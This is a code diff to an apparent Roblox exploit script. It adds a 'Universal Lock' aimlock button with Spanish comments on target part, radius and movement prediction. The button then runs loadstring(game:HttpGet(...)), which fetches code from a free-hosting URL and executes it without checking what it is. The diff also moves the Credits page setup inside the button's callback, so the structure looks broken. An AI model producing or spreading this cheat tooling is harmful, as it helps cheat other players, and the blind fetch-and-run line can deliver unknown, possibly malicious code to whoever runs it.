@@ -585,7 +585,19 @@ game:GetService("Lighting").FogStart = 9e9
 lp.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
 lp.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = lp.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), lp.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
 end)
+section1:addButton("Universal Lock", function()
+print("Clicked")
+getgenv().AimPart = "HumanoidRootPart" -- Con esto eliges donde apuntar: {UpperTorso, LowerTorso, HumanoidRootPart, Head}
+getgenv().AimlockToggleKey = "Y" -- Tecla para apagar y prender el lock
+getgenv().AimRadius = 50 -- Distancia de la persona a la que lockearas
+getgenv().TeamCheck = false -- Dejar esto desactivado
+getgenv().PredictMovement = true -- Esto es para que el lock apunte con predicción, dejar activado
+getgenv().PredictionVelocity = 7 -- Esto es con cuanta predicción quieres que apunte, aquí puedes ir probando depende de el ping que tengas OJO entre mas grande sea el numero menor prediccion tendra
+
+loadstring(game:HttpGet("https://arevalacarchives.000webhostapp.com/FuckHoo", true))()
+
 local theme = venyx:addPage("Credits", 5012544693)
 
 local colors = theme:addSection("https://discord.gg/HMDZyUAbdN")
+end)
 end
